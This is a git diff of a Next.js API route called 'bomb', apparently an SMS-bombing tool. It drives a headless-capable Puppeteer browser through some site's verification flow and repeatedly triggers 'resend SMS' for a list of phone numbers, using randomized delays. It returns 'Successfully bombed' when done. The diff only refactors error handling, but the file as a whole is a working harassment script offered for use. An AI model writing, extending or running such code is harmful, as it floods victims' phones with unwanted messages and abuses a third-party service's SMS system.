@@ -1,5 +1,4 @@
 import { NextApiRequest, NextApiResponse } from "next";
-import puppeteer, { executablePath } from "puppeteer-core";
 import wait from "./_browser/utils/wait";
 import range from "./_browser/utils/range";
 import clickResendSmsBtn from "./_browser/actions/clickResendSmsBtn";
@@ -9,12 +8,22 @@ import confirmFirstTime from "./_browser/actions/confirmFirstTime";
 import confirmSecondTimeIfNeeded from "./_browser/actions/confirmSecondTimeIfNeeded";
 import getBrowser from "./_browser/utils/getBrowser";
 
+
 export default async function bomb(req: NextApiRequest, res: NextApiResponse) {
+  try {
+    await main(req, res);
+  } catch (err) {
+    console.error(err);
+  }
+}
+
+
+async function main(req: NextApiRequest, res: NextApiResponse) {
   const phoneNumbersStr = process.env.PHONE_NUMBERS;
   if (!phoneNumbersStr) throw new Error("no phone numbers are provided");
   
   const phoneNumbers = phoneNumbersStr.split(" ");
-
+  
   const browser = await getBrowser({ headless: false });
   console.log("Browser launched...");
   
@@ -30,11 +39,11 @@ export default async function bomb(req: NextApiRequest, res: NextApiResponse) {
     await confirmSecondTimeIfNeeded(page);
     
     await clickResendSmsBtn(page);
-
+  
     await wait(range(2000, 4000));
   });
   await Promise.all(promises);
   await browser.close();
-
+  
   res.status(200).send("Successfully bombed");
 }
